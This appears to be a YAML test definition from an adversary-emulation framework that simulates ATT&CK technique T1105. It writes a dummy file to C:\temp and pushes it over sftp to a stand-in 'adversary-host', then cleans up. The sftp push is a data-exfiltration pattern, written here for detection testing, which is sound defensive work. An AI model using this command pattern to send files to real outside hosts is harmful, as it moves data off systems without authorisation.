- description: 'This test simulates pushing files using SFTP on a Windows environment.

    '
  id: 5dc66b14-bf49-afbc-fb06-bf552fa01f43
  name: Windows push file using sftp.exe
  platforms:
    windows:
      psh:
        cleanup: '$filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"; Remove-Item
          -Path $filePath -Force; Write-Output "File deleted: $filePath"'
        command: '$folderPath = "C:\temp"; if (-Not (Test-Path -Path $folderPath))
          {;     New-Item -Path $folderPath -ItemType Directory; }; $filePath = Join-Path
          -Path $folderPath -ChildPath "T1105.txt"; New-Item -Path $filePath -ItemType
          File -Force; Write-Output "File created: $filePath"; echo "put C:\temp\T1105.txt"
          | sftp adversary@adversary-host:/tmp'
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: Ingress Tool Transfer
